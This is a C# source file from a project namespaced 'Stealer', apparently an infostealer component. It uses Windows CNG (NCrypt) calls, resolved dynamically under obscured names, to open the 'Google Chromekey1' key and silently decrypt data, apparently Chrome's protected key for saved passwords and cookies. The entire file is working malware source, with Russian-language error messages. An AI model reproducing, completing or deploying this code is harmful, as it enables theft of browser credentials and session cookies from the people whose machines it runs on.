using System;
using System.Runtime.InteropServices;
using Stealer.Utils;

namespace Stealer.Crypto
{
    public static class CngDecryptor
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate int NOSPDelegate(out IntPtr phProvider, string pszProviderName, int dwFlags);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate int NOKDelegate(IntPtr hProvider, out IntPtr phKey, string pszKeyName, int dwLegacyKeySpec, int dwFlags);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate int NDDelegate(IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate int NFODelegate(IntPtr hObject);

        private static NOSPDelegate _nosp;
        private static NOKDelegate _nok;
        private static NDDelegate _nd;
        private static NFODelegate _nfo;

        private static NOSPDelegate GetNOSP() { return _nosp ?? (_nosp = NativeLoader.Resolve<NOSPDelegate>(NativeLoader.Lib_NC, NativeLoader.Fn_NOSP)); }
        private static NOKDelegate GetNOK() { return _nok ?? (_nok = NativeLoader.Resolve<NOKDelegate>(NativeLoader.Lib_NC, NativeLoader.Fn_NOK)); }
        private static NDDelegate GetND() { return _nd ?? (_nd = NativeLoader.Resolve<NDDelegate>(NativeLoader.Lib_NC, NativeLoader.Fn_ND)); }
        private static NFODelegate GetNFO() { return _nfo ?? (_nfo = NativeLoader.Resolve<NFODelegate>(NativeLoader.Lib_NC, NativeLoader.Fn_NFO)); }

        private const int NCRYPT_SILENT_FLAG = 64;

        public static byte[] Decrypt(byte[] inputData, string providerName = "Microsoft Software Key Storage Provider", string keyName = "Google Chromekey1")
        {
            IntPtr zero = IntPtr.Zero;
            IntPtr zero2 = IntPtr.Zero;

            try
            {
                int num = GetNOSP()(out zero, providerName, 0);
                if (num != 0)
                {
                    throw new Exception(string.Format("Ошибка NCryptOpenStorageProvider: Код {0}", num));
                }

                num = GetNOK()(zero, out zero2, keyName, 0, 0);
                if (num != 0)
                {
                    throw new Exception(string.Format("Ошибка NCryptOpenKey: Код {0}", num));
                }

                int num2;
                num = GetND()(zero2, inputData, inputData.Length, IntPtr.Zero, null, 0, out num2, NCRYPT_SILENT_FLAG);
                if (num != 0)
                {
                    throw new Exception(string.Format("Ошибка определения размера NCryptDecrypt: Код {0}", num));
                }

                byte[] array = new byte[num2];
                num = GetND()(zero2, inputData, inputData.Length, IntPtr.Zero, array, array.Length, out num2, NCRYPT_SILENT_FLAG);
                if (num != 0)
                {
                    throw new Exception(string.Format("Ошибка NCryptDecrypt: Код {0}", num));
                }

                Array.Resize<byte>(ref array, num2);
                return array;
            }
            finally
            {
                if (zero2 != IntPtr.Zero)
                {
                    GetNFO()(zero2);
                }
                if (zero != IntPtr.Zero)
                {
                    GetNFO()(zero);
                }
            }
        }
    }
}
